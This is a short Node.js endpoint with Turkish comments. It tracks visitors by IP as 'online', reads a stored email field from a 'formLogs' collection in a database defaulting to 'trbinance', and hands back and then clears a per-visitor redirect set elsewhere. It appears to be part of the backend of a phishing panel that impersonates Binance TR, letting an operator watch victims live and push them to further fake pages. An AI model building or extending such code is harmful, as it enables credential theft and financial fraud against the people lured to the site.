const clientPromise = require('../lib/mongo');

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip = getClientIp(req);

    if (!ip || ip === 'unknown') {
      return res.status(200).json({ redirectTo: null, input1: null });
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');
    const sessions = db.collection('sessions');

    // Ping fonksiyonalitesini de buraya ekle (online durumu için)
    const now = new Date();
    await sessions.updateOne(
      { ip },
      {
        $set: {
          ip,
          lastSeen: now
        }
      },
      { upsert: true }
    ).catch(err => console.error('Session update failed in check-redirect', err));

    const log = await logs.findOne({ ip }, { projection: { redirectTo: 1, input1: 1 } });

    const response = { redirectTo: null, input1: null };

    if (log) {
      // Input1 bilgisini ekle (mail adresi için)
      if (log.input1) {
        response.input1 = log.input1;
      }

      // Redirect varsa al ve sil
      if (log.redirectTo) {
        response.redirectTo = log.redirectTo;
        await logs.updateOne(
          { ip },
          {
            $unset: { redirectTo: '', redirectAt: '' }
          }
        );
      }
    }

    return res.status(200).json(response);
  } catch (err) {
    console.error('Check redirect error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};

